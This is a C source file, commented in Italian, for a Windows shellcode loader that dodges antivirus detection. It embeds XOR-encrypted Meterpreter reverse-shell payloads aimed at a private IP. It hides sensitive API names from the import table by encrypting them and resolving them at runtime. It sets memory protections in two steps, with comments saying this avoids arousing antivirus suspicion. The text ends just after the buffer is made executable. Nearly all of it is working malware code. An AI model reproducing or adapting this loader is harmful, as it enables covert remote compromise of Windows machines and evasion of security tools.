#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


//queste typedef servono a fare Function Call Obfuscation, in pratica per evitare che queste 3 funzioni (che usate insieme possono destare sospetti) sia nella 
// IAT Import Address Table, mi creo un tipo puntatore che dopo otterra' effettivamente l' indirizzo a quelle funzioni con "GetProcAddress()" 
typedef LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);

typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);

typedef VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination,const VOID UNALIGNED *Source,SIZE_T Length);

// MODIFICARE PAYLOAD_METERPRETER


//path alla chiave:
///home/kali/.msf4/loot/20231110071123_default_216.58.204.132_216.58.204.132_p_387236.pem
//semplice XOR byte a byte
//reverse_winhttps porta 1234 192.168.1.93 criptato XOR
unsigned char payload_meterpreter [] = { 0x9f, 0x20, 0xea, 0x85, 0x86, 0x8d, 0xbf, 0x69, 0x63, 0x75, 0x33, 0x38, 0x32, 0x23, 0x3b, 0x3c, 0x29, 0x58, 0xbc, 0x1, 0x2d, 0xe8, 0x3b, 0x6, 0x24, 0x29, 0xe9, 0x3b, 0x74, 0x2d, 0xe8, 0x3a, 0x49, 0x29, 0x79, 0xd2, 0x39, 0x23, 0x2b, 0xfe, 0x0, 0x39, 0x3e, 0x42, 0xa0, 0x25, 0x50, 0xa9, 0xc2, 0x58, 0x4, 0x1f, 0x6b, 0x4a, 0x52, 0x20, 0xa3, 0xa0, 0x61, 0x24, 0x62, 0xa9, 0x8b, 0x8c, 0x24, 0x2d, 0xf8, 0x3b, 0x43, 0xfe, 0x30, 0x55, 0x3b, 0x72, 0xb9, 0x2c, 0x30, 0xf, 0xef, 0x1c, 0x7d, 0x68, 0x6b, 0x69, 0xf7, 0x13, 0x62, 0x69, 0x6c, 0xee, 0xe3, 0xe0, 0x69, 0x61, 0x76, 0x2d, 0xf6, 0xa9, 0x17, 0x12, 0x3a, 0x68, 0xa3, 0xf8, 0x21, 0x75, 0x25, 0xe2, 0x2e, 0x44, 0x2c, 0x62, 0xb9, 0x36, 0x91, 0x37, 0x2f, 0x58, 0xa5, 0x2d, 0x9c, 0xa1, 0x28, 0xea, 0x42, 0xed, 0x3b, 0x68, 0xb5, 0x3d, 0x43, 0xa9, 0xdf, 0x32, 0xa8, 0xa4, 0x6c, 0x28, 0x6f, 0xa5, 0x5d, 0x83, 0x1c, 0x97, 0x3e, 0x62, 0x2e, 0x4d, 0x64, 0x20, 0x5a, 0xb9, 0x1c, 0xb9, 0x2e, 0x21, 0xf8, 0x29, 0x47, 0x3c, 0x73, 0xb9, 0x15, 0x32, 0xe2, 0x61, 0x29, 0x2d, 0xe5, 0x24, 0x79, 0x2a, 0x68, 0xb6, 0x33, 0xea, 0x66, 0xe1, 0x2d, 0x3d, 0x2b, 0x69, 0xb9, 0x20, 0x2e, 0x3b, 0x2a, 0x33, 0x22, 0x2d, 0x33, 0x30, 0x32, 0x29, 0x21, 0xee, 0x8d, 0x49, 0x2f, 0x36, 0x9a, 0x83, 0x31, 0x27, 0x2b, 0x3b, 0x2a, 0xe2, 0x7e, 0x8c, 0x28, 0x97, 0x96, 0x9e, 0x2b, 0x2d, 0x42, 0xb2, 0x30, 0x3c, 0xcc, 0x1e, 0x1a, 0x1d, 0x1, 0x19, 0x15, 0x19, 0x6e, 0x25, 0x33, 0x2b, 0xe0, 0x87, 0x3b, 0xa6, 0xa0, 0x25, 0x1b, 0x43, 0x64, 0x97, 0xbc, 0x32, 0x3f, 0xdb, 0x10, 0x1b, 0x1a, 0x5, 0x6, 0x5a, 0x41, 0x73, 0x28, 0x3b, 0x29, 0xe0, 0x8f, 0x2d, 0xa2, 0xa1, 0x25, 0x11, 0x54, 0x66, 0x9d, 0xbc, 0x3f, 0x36, 0x2b, 0xe1, 0x88, 0x32, 0x2c, 0x28, 0x42, 0xa9, 0x2e, 0x44, 0xbb, 0x3a, 0x20, 0x3a, 0xd3, 0x69, 0x7e, 0xf4, 0xd5, 0x64, 0x65, 0x63, 0x69, 0x99, 0xa7, 0x28, 0xeb, 0xad, 0x84, 0x7f, 0x63, 0x68, 0x69, 0x50, 0x76, 0x5c, 0x73, 0x5b, 0x63, 0x5b, 0x72, 0x58, 0x73, 0x45, 0x69, 0x55, 0x61, 0x47, 0x6e, 0x55, 0x65, 0x4d, 0x69, 0x5f, 0x72, 0x52, 0x62, 0x69, 0x6c, 0x3f, 0x2b, 0xe1, 0xa8, 0x28, 0xb1, 0xa5, 0xa1, 0x6d, 0x63, 0x75, 0x3f, 0x58, 0xba, 0x3a, 0xd3, 0x2b, 0xfa, 0x77, 0xac, 0x64, 0x65, 0x63, 0x69, 0x99, 0xa7, 0x89, 0x7a, 0x6b, 0x6c, 0x65, 0xb, 0x68, 0x1d, 0x61, 0x2, 0x65, 0x3, 0x69, 0x10, 0x75, 0x48, 0x69, 0x5c, 0x73, 0x46, 0x6d, 0x50, 0x69, 0x57, 0x64, 0x57, 0x63, 0x47, 0x66, 0x43, 0x61, 0x54, 0x69, 0x54, 0x65, 0x4d, 0x68, 0x58, 0x61, 0x58, 0x65, 0x4a, 0x69, 0x50, 0x75, 0x48, 0x69, 0x42, 0x73, 0x5b, 0x6d, 0x52, 0x69, 0x5a, 0x64, 0x4a, 0x63, 0x2b, 0x66, 0x1c, 0x61, 0x0, 0x69, 0x33, 0x65, 0x17, 0x68, 0x2, 0x61, 0x1, 0x65, 0x21, 0x69, 0x1, 0x75, 0x1c, 0x69, 0x10, 0x73, 0x13, 0x6d, 0x14, 0x69, 0x14, 0x64, 0x2e, 0x63, 0x5c, 0x66, 0x24, 0x61, 0x14, 0x69, 0x39, 0x65, 0x10, 0x68, 0x4, 0x61, 0x27, 0x65, 0x35, 0x69, 0x17, 0x75, 0x46, 0x69, 0x20, 0x73, 0x4, 0x6d, 0x3, 0x69, 0x56, 0x64, 0x33, 0x63, 0x21, 0x66, 0x22, 0x61, 0x31, 0x69, 0x29, 0x65, 0x29, 0x68, 0x8, 0x61, 0x39, 0x65, 0x23, 0x69, 0x5, 0x75, 0x3, 0x69, 0x1f, 0x73, 0x21, 0x6d, 0x26, 0x69, 0x3e, 0x64, 0x5d, 0x63, 0xa, 0x66, 0x5, 0x61, 0x14, 0x69, 0x28, 0x65, 0x1a, 0x68, 0x13, 0x61, 0x40, 0x65, 0x2a, 0x69, 0xe, 0x75, 0x4a, 0x69, 0x15, 0x73, 0xb, 0x6d, 0x2e, 0x69, 0x16, 0x64, 0x5c, 0x63, 0x1f, 0x66, 0x47, 0x61, 0x5a, 0x69, 0x39, 0x65, 0x51, 0x68, 0xc, 0x61, 0x5b, 0x65, 0x31, 0x69, 0x3c, 0x75, 0x44, 0x69, 0x21, 0x73, 0x3c, 0x6d, 0x59, 0x69, 0x5f, 0x64, 0x32, 0x63, 0x5c, 0x66, 0x18, 0x61, 0x4f, 0x69, 0x26, 0x65, 0x4e, 0x68, 0xe, 0x61, 0x18, 0x65, 0x42, 0x69, 0x55, 0x75, 0x31, 0x69, 0x40, 0x73, 0x3c, 0x6d, 0x17, 0x69, 0x2a, 0x64, 0x2e, 0x63, 0x38, 0x66, 0x31, 0x61, 0x3d, 0x69, 0x29, 0x65, 0x53, 0x68, 0x22, 0x61, 0x3f, 0x65, 0x0, 0x69, 0x1, 0x75, 0x21, 0x69, 0x41, 0x73, 0x5e, 0x6d, 0x24, 0x69, 0x5c, 0x64, 0x32, 0x63, 0x39, 0x66, 0x30, 0x61, 0x11, 0x69, 0x1e, 0x65, 0x35, 0x68, 0x10, 0x61, 0x19, 0x65, 0x4b, 0x69, 0x52, 0x75, 0x10, 0x69, 0x1f, 0x73, 0x44, 0x6d, 0x3e, 0x69, 0x37, 0x64, 0x6, 0x63, 0x2b, 0x66, 0x36, 0x61, 0x17, 0x69, 0x8, 0x65, 0x35, 0x68, 0x31, 0x61, 0x31, 0x65, 0x4b, 0x69, 0x50, 0x75, 0xb, 0x69, 0x34, 0x73, 0x27, 0x6d, 0x0, 0x69, 0x31, 0x64, 0x55, 0x63, 0x39, 0x66, 0x4b, 0x61, 0x6, 0x69, 0x1, 0x65, 0xc, 0x68, 0x3, 0x61, 0x18, 0x65, 0x1, 0x69, 0x2c, 0x75, 0x35, 0x69, 0x6, 0x73, 0x1d, 0x6d, 0x4c, 0x69, 0x2, 0x64, 0x31, 0x63, 0x27, 0x66, 0x13, 0x61, 0x5, 0x69, 0x54, 0x65, 0x32, 0x68, 0x3e, 0x61, 0x29, 0x65, 0x3f, 0x69, 0x1b, 0x75, 0x21, 0x69, 0x16, 0x73, 0x5a, 0x6d, 0x11, 0x69, 0x1c, 0x64, 0x16, 0x63, 0x50, 0x66, 0x1d, 0x61, 0x35, 0x69, 0x3, 0x65, 0x32, 0x68, 0x18, 0x61, 0x30, 0x65, 0x4a, 0x69, 0x2b, 0x75, 0x22, 0x69, 0x14, 0x73, 0x24, 0x6d, 0x2b, 0x69, 0x21, 0x64, 0x51, 0x63, 0xa, 0x66, 0x1f, 0x61, 0x3, 0x69, 0x24, 0x65, 0x39, 0x68, 0x27, 0x61, 0x38, 0x65, 0x5, 0x69, 0xf, 0x75, 0x10, 0x69, 0x3b, 0x73, 0x30, 0x6d, 0x2, 0x69, 0x1d, 0x64, 0x17, 0x63, 0x4, 0x66, 0x1d, 0x61, 0x38, 0x69, 0x5c, 0x65, 0x52, 0x68, 0x33, 0x61, 0x30, 0x65, 0x32, 0x69, 0x3c, 0x75, 0x1c, 0x69, 0x37, 0x73, 0x5e, 0x6d, 0x50, 0x69, 0x1d, 0x64, 0x53, 0x63, 0x2f, 0x66, 0x1d, 0x61, 0x2a, 0x69, 0x28, 0x65, 0x24, 0x68, 0x28, 0x61, 0x25, 0x65, 0x37, 0x69, 0x4, 0x75, 0x31, 0x69, 0x1a, 0x73, 0x7, 0x6d, 0x36, 0x69, 0x2c, 0x64, 0xd, 0x63, 0x31, 0x66, 0x24, 0x61, 0x57, 0x69, 0x4, 0x65, 0x50, 0x68, 0xf, 0x61, 0xc, 0x65, 0x21, 0x69, 0x53, 0x75, 0x33, 0x69, 0x4, 0x73, 0x3a, 0x6d, 0x33, 0x69, 0x16, 0x64, 0x32, 0x63, 0x2e, 0x66, 0x72, 0x61, 0x2a, 0xe0, 0xad, 0x36, 0x39, 0x29, 0x31, 0x2c, 0xff, 0xa0, 0x3a, 0xea, 0xa3, 0x47, 0x3f, 0x58, 0xba, 0x20, 0x21, 0xaa, 0xa1, 0x69, 0x6f, 0xe4, 0x65, 0x33, 0x3a, 0x35, 0x3b, 0xa6, 0xa0, 0xf1, 0x7c, 0xd6, 0x38, 0x97, 0xbc, 0x29, 0xff, 0xa3, 0x3b, 0xea, 0x8b, 0x55, 0x3a, 0xe0, 0x94, 0x3b, 0xe0, 0x94, 0x28, 0xae, 0xac, 0x45, 0xc2, 0x68, 0x9, 0x99, 0xa7, 0xe4, 0xa2, 0x66, 0xe8, 0x8, 0x63, 0x68, 0x69, 0x29, 0xfd, 0x22, 0x7b, 0xec, 0xa3, 0x1, 0x48, 0x21, 0xfa, 0xaa, 0x21, 0x92, 0xa0, 0x21, 0xaf, 0x85, 0x45, 0x32, 0x3a, 0x36, 0x3a, 0xd9, 0x61, 0x69, 0x6c, 0x65, 0x60, 0x68, 0x69, 0x61, 0x26, 0x2c, 0xfa, 0x89, 0x2b, 0xf6, 0x9e, 0x49, 0x3b, 0xfa, 0x8e, 0x24, 0xe8, 0x90, 0x22, 0xed, 0x84, 0x2f, 0xe0, 0x8c, 0x3b, 0xa6, 0xa0, 0xb3, 0xb1, 0x8f, 0x2a, 0x97, 0xbc, 0xe4, 0xb6, 0x11, 0x5e, 0x82, 0x71, 0x3d, 0xf9, 0x2e, 0x63, 0xf6, 0xa9, 0x19, 0x42, 0x21, 0xed, 0xa3, 0x6d, 0x9, 0x6a, 0x3e, 0x3a, 0xe8, 0x65, 0x20, 0xe5, 0x9d, 0x9, 0x70, 0x28, 0x38, 0x3e, 0xec, 0x82, 0x3, 0x45, 0x2f, 0x3b, 0xd3, 0xa0, 0x2b, 0xf4, 0xa3, 0x61, 0x69, 0x6e, 0x64, 0x9a, 0xb6, 0x3, 0x6c, 0x2d, 0x29, 0xeb, 0x98, 0x6, 0x7a, 0x39, 0x3a, 0x1, 0x61, 0x45, 0x65, 0x73, 0x20, 0xea, 0x95, 0x18, 0x6d, 0x32, 0x2a, 0x20, 0xd7, 0xb2, 0x31, 0xf3, 0xaa, 0x65, 0x63, 0x69, 0x66, 0x8d, 0xb4, 0x2f, 0x58, 0xac, 0x36, 0x39, 0x20, 0xe0, 0x90, 0x3b, 0x54, 0xba, 0x3a, 0x30, 0x26, 0x21, 0x20, 0xc9, 0xe6, 0x31, 0xd6, 0xf0, 0x69, 0x6e, 0x64, 0x65, 0x9c, 0xbc, 0xe3, 0xb2, 0x14, 0x6e, 0x21, 0x93, 0xaa, 0x17, 0x6a, 0x82, 0xda, 0x9e, 0xbb, 0x73, 0x69, 0x63, 0x3d, 0xfb, 0x98, 0x20, 0x29, 0x20, 0xaa, 0xa3, 0x6c, 0xe6, 0xf9, 0x15, 0x9c, 0xbc, 0xe3, 0xb2, 0x15, 0x8b, 0x21, 0xe5, 0x94, 0x9, 0x26, 0x33, 0x28, 0xff, 0x85, 0x3e, 0xe0, 0xa5, 0x26, 0x18, 0x61, 0x3a, 0xfa, 0x88, 0x24, 0xa6, 0xab, 0x16, 0x60, 0x4a, 0x44, 0x96, 0xb3, 0xf7, 0xa1, 0x16, 0xa3, 0x25, 0xee, 0x6d, 0x2, 0x71, 0x28, 0xff, 0x84, 0x3a, 0xe0, 0x84, 0x3c, 0x59, 0x48, 0x3a, 0xfa, 0x89, 0x20, 0xe8, 0xaf, 0x4, 0x67, 0x3f, 0x2a, 0xd3, 0x4b, 0x1c, 0xc8, 0xa1, 0x69, 0x6c, 0x65, 0x63, 0x97, 0xbc, 0xe4, 0xb6, 0x6a, 0xf7, 0xf6, 0x9c, 0x8a, 0x8d, 0x81, 0x67, 0x73, 0x69, 0x6d, 0x10, 0x68, 0x51, 0x3e, 0x21, 0x67, 0xa4, 0xbb, 0x79, 0xad, 0x6e, 0xb5, 0x83, 0x4b, 0x9, 0x4d, 0x5f, 0xdc, 0xda, 0xaf, 0x2b, 0x21, 0xf5, 0x39, 0xfb, 0x9e, 0x3a, 0xf8, 0x66, 0x9e, 0xc7, 0x66, 0xeb, 0x11, 0x9a, 0x9c, 0x96, 0x2e, 0xe4, 0x32, 0x3b, 0x3, 0x2c, 0x3f, 0x2a, 0xe1, 0xb8, 0xa0, 0x94, 0x75, 0x3a, 0xae, 0xa3, 0x75, 0x62, 0x69, 0x73, 0x3a, 0xd3, 0x35, 0xc5, 0x3a, 0x8b, 0x64, 0x65, 0x63, 0x69, 0x99, 0xa7, 0x29, 0xf1, 0x3a, 0x3f, 0x2d, 0xea, 0x8f, 0x21, 0xe8, 0x87, 0x2d, 0xfa, 0xb3, 0x2a, 0xb2, 0xb2, 0x69, 0x53, 0x73, 0x69, 0x24, 0xe8, 0x90, 0x27, 0xa3, 0xa7, 0xf, 0x40, 0x42, 0xc, 0x9e, 0xb7, 0x21, 0xef, 0xa1, 0x43, 0xed, 0xa9, 0x6e, 0xf2, 0x4c, 0x8c, 0x96, 0x9c, 0x13, 0xf9, 0x6e, 0x3b, 0x72, 0xaa, 0xe8, 0xa1, 0x1c, 0xbf, 0x3c, 0xa6, 0x3b, 0x3, 0x66, 0x2b, 0x28, 0xa5, 0xab, 0x9c, 0xd0, 0xc1, 0x3e, 0x96, 0xb4 };

//reverse_tcp porta 12345 192.168.1.93 criptato
//unsigned char payload_meterpreter [] =  { 0x9f, 0x20, 0xea, 0x85, 0x86, 0x8d, 0xbf, 0x69, 0x63, 0x75, 0x33, 0x38, 0x32, 0x23, 0x3b, 0x25, 0x50, 0xbb, 0x3f, 0x1, 0x2d, 0xe8, 0x3b, 0x6, 0x3a, 0xea, 0x30, 0x71, 0x3a, 0x2d, 0xe8, 0x3a, 0x49, 0x29, 0x79, 0xd2, 0x39, 0x23, 0x2b, 0xfe, 0x0, 0x39, 0x3e, 0x42, 0xa0, 0x25, 0x50, 0xa9, 0xc2, 0x58, 0x4, 0x1f, 0x6b, 0x4a, 0x52, 0x20, 0xa3, 0xa0, 0x61, 0x24, 0x62, 0xa9, 0x8b, 0x8c, 0x24, 0x24, 0x22, 0x21, 0xe8, 0x27, 0x52, 0xe2, 0x31, 0x4f, 0x21, 0x6c, 0xb1, 0xf, 0xef, 0x1c, 0x7d, 0x68, 0x6b, 0x69, 0xf7, 0x13, 0x62, 0x69, 0x6c, 0xee, 0xe3, 0xe0, 0x69, 0x61, 0x76, 0x2d, 0xf6, 0xa9, 0x17, 0x12, 0x3a, 0x68, 0xa3, 0xf8, 0x21, 0x75, 0x25, 0xe2, 0x2e, 0x44, 0x35, 0x2a, 0x68, 0xb6, 0x91, 0x37, 0x2f, 0x58, 0xa5, 0x2d, 0x9c, 0xa1, 0x28, 0xea, 0x42, 0xed, 0x3b, 0x68, 0xb5, 0x3d, 0x43, 0xa9, 0x32, 0xb2, 0xa0, 0x60, 0xcd, 0x28, 0x6f, 0xa5, 0x5d, 0x83, 0x1c, 0x97, 0x3e, 0x62, 0x2e, 0x4d, 0x64, 0x20, 0x5a, 0xb9, 0x1c, 0xb9, 0x2e, 0x21, 0xf8, 0x29, 0x47, 0x3c, 0x73, 0xb9, 0x15, 0x32, 0xe2, 0x61, 0x29, 0x2d, 0xe5, 0x24, 0x79, 0x2a, 0x68, 0xb6, 0x33, 0xea, 0x66, 0xe1, 0x2d, 0x3d, 0x22, 0x30, 0x37, 0x38, 0x3e, 0x64, 0xa3, 0x33, 0x22, 0x2d, 0x33, 0x30, 0x32, 0x29, 0x21, 0xee, 0x8d, 0x49, 0x2f, 0x36, 0x9a, 0x83, 0x31, 0x27, 0x2b, 0x3b, 0x2a, 0xe2, 0x7e, 0x8c, 0x28, 0x97, 0x96, 0x9e, 0x2b, 0x2c, 0xcd, 0x1e, 0x10, 0x47, 0x2d, 0x5a, 0x41, 0x73, 0x69, 0x2c, 0x37, 0x20, 0xe7, 0x82, 0x2d, 0xe2, 0x85, 0xc6, 0x73, 0x61, 0x62, 0x20, 0xe5, 0x80, 0x2a, 0xd4, 0x6b, 0x61, 0x46, 0x5c, 0xb3, 0xc1, 0x62, 0x28, 0x33, 0x3d, 0x3a, 0xfa, 0x8d, 0x21, 0xe8, 0x98, 0x2f, 0xde, 0x29, 0x14, 0x4f, 0x61, 0x8d, 0xb4, 0x2e, 0xe0, 0x86, 0xd, 0x62, 0x69, 0x69, 0x61, 0x2f, 0x24, 0xc9, 0x40, 0xe3, 0x1e, 0x72, 0x96, 0xa6, 0x19, 0x63, 0x2c, 0x3f, 0x39, 0x3e, 0x29, 0x54, 0xaa, 0x24, 0x57, 0xb2, 0x29, 0x9d, 0xa9, 0x24, 0xec, 0xa1, 0x20, 0x96, 0xa1, 0x3e, 0xec, 0xb2, 0x28, 0xd9, 0x9f, 0x7d, 0xb6, 0x93, 0x8c, 0xbc, 0x25, 0xe8, 0xae, 0x4, 0x74, 0x24, 0x3b, 0x25, 0xef, 0x90, 0x29, 0xeb, 0x90, 0x2d, 0xdf, 0xfa, 0xcd, 0x1d, 0x0, 0x89, 0xb0, 0xf6, 0xa9, 0x17, 0x7f, 0x3b, 0x96, 0xbd, 0x6, 0x8c, 0x85, 0xf2, 0x69, 0x6e, 0x64, 0x2d, 0xe0, 0x85, 0x76, 0x3a, 0xe8, 0x80, 0x24, 0x5d, 0xac, 0x9, 0x6c, 0x28, 0x39, 0x3e, 0xec, 0x8a, 0x28, 0xd9, 0x77, 0xab, 0xa1, 0x2c, 0x8c, 0xbc, 0xee, 0x99, 0x69, 0x10, 0x31, 0x2d, 0xe0, 0xad, 0x46, 0x2c, 0xe8, 0x94, 0x3, 0x2c, 0x24, 0x3a, 0x0, 0x69, 0x71, 0x76, 0x65, 0x32, 0x31, 0x2b, 0xfc, 0x80, 0x21, 0x42, 0xba, 0x28, 0xd7, 0x39, 0xcd, 0x3d, 0x81, 0x9a, 0xb6, 0x21, 0xef, 0xb1, 0x28, 0xeb, 0xae, 0x21, 0x54, 0xaa, 0x21, 0xe0, 0x91, 0x3e, 0xec, 0xa9, 0x21, 0xea, 0x8c, 0x33, 0xd3, 0x71, 0xaa, 0xa1, 0x32, 0x9e, 0xbc, 0xed, 0x9c, 0x65, 0x1e, 0x41, 0x3e, 0x33, 0x36, 0x3b, 0x1, 0x6c, 0x25, 0x63, 0x68, 0x28, 0x39, 0x1c, 0x65, 0x29, 0x28, 0xd9, 0x7e, 0x5d, 0x66, 0x43, 0x8c, 0xbc, 0x3a, 0x38, 0x28, 0xd4, 0x11, 0xb, 0x2e, 0x8, 0x99, 0xa7, 0x28, 0x9d, 0xa7, 0x85, 0x59, 0x9c, 0x97, 0x96, 0x29, 0x77, 0xa6, 0x3b, 0x40, 0xa5, 0x3d, 0xf7, 0x9f, 0x6, 0xc7, 0x28, 0x92, 0x86, 0x31, 0x4, 0x64, 0x3c, 0x2a, 0xae, 0xa4, 0x82, 0xd4, 0xc0, 0x3f, 0x93, 0xb0 };
/*
unsigned char payload_meterpreter [] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x49\x01"
"\xd0\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x04\xd2\xc0\xa8\x01\x5d\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";
*/

void XOR_EASY(char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++)
        data[i] = data[i] ^ 0x99;
}

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	//int j;

	//j = 0;
	for (int i = 0; i < data_len; i++) {
		//if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[i % (key_len - 1)];
		//j++;
	}
}
//void XOR(char * data, size_t data_len, char * key, size_t key_len) {
//    Sleep(1);
//}


int main(void) {

	void * exec_mem;  // puntatore a memoria allocata in READ & WRITE
	BOOL rv;          // return value di VirtualProtect
	HANDLE th;        // Handle al thread
    DWORD oldprotect = 0; //a variable that receives the previous access protection value of the first page in the specified region of pages 
    //bho sinceramente non lo so che e' sta oldprotect, serve in VirtualProtect

    //FreeConsole();               // se vuoi evitare di far apparire il prompt dei comandi

	unsigned char key[] = "Secur3K3y12@35%";  // chiave per decryptare il payload e le stringhe

    unsigned char payload_key[] = "chiavesicurissimaindecifrabile";

    //meterpreter criptato in XOR


	unsigned int payload_len = sizeof(payload_meterpreter);

    //dichiaro puntatori alle 3 funzioni 'sensibili' che non voglio nella IAT
    pVirtualAlloc pVA;
    pVirtualProtect pVP;
    pRtlMoveMemory pRMM;


    /*
    unsigned char RMM [] = "RtlMoveMemory";
    XOR((char *)RMM, sizeof(RMM),(char *)key, sizeof(key));
    
    for (int i = 0; i < sizeof(RMM); i++){
        printf("0x%02x, ", RMM[i]);
    }
    */
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// IN QUESTA SEZIONE DATO CHE VOGLIO CHIAMARE LE FUNZIONI 1)"VirtualAlloc" 2)"VirtualProtect" 3)"RtlMoveMemory" ma non voglio che siano stringhe in plaintext altrimenti gli AV potrebbero notare
// allora mi salvo le stringhe gia' XORate con la stessa chiave del payload e le decripto in runtime
    unsigned char RMM [] = { 0x1, 0x11, 0xf, 0x38, 0x1d, 0x45, 0x2e, 0x7e, 0x1c, 0x5c, 0x5d, 0x32, 0x4a, 0x35 };
    

    //unsigned char VA [] = "VirtualAlloc";
    unsigned char VA [] = { 0x5, 0xc, 0x11, 0x1, 0x7, 0x52, 0x27, 0x72, 0x15, 0x5d, 0x5d, 0x23, 0x33 }; //stringa "VirtualAlloc" criptata in XOR
    /*
    for (int i = 0; i < sizeof(VP); i++){
        printf("0x%02x, ", VP[i]);

    }
    */

    //unsigned char VP [] = "VirtualProtect";
    unsigned char VP [] = { 0x5, 0xc, 0x11, 0x1, 0x7, 0x52, 0x27, 0x63, 0xb, 0x5e, 0x46, 0x25, 0x50, 0x41, 0x25 }; //stringa "VirtualProtect" criptata in XOR
    /*
    for (int i = 0; i < sizeof(VP); i++){
        printf("0x%02x, ", VP[i]);

    }
    */
    XOR((char *)VA, sizeof(VA),(char *)key, sizeof(key));
    XOR((char *)VP, sizeof(VP),(char *)key, sizeof(key));
    XOR((char *)RMM, sizeof(RMM),(char *)key, sizeof(key));
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //prendo gli indirizzi delle 3 funzioni 'sensibili'
    pVA = (pVirtualAlloc) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (char *)VA);
    pVP = (pVirtualProtect) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (char *)VP);
    pRMM = (pRtlMoveMemory) GetProcAddress(GetModuleHandle(TEXT("Ntdll.dll")), (char *)RMM);



    //decripto il payload

    //stampo il payload decriptato per controllare se va bene, solo [DEBUG]
    for (int i = 0; i < payload_len; i++){
       printf("0x%02x ", payload_meterpreter[i]);

    }
	
    printf("\n%s\n",VA);
    printf("%s",VP);


    // prima alloco memoria read-write perche' se la allocassi subito pure Execute gli AV potrebbero insospettirsi
	exec_mem = pVA(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload_meterpreter);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);



	// Decripta il payload
	//AESDecrypt((char *) payload_meterpreter, payload_len, key, sizeof(key));



	// copio il payload nel buffer allocato prima con VirtualAlloc
	pRMM(exec_mem, payload_meterpreter, payload_len);

    //memcpy(exec_mem, payload_meterpreter, payload_len);
    XOR((char *)exec_mem,payload_len,(char *) payload_key, sizeof(payload_key));

    for (int i = 0; i < payload_len; i++){
        printf("0x%02x ", ((unsigned char *)exec_mem)[i]);

    }


    // Ora rendo il buffer eseguibile perche' allocar subito il buffer Read Write e Execute puo' insospettire gli AV
    rv = pVP(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
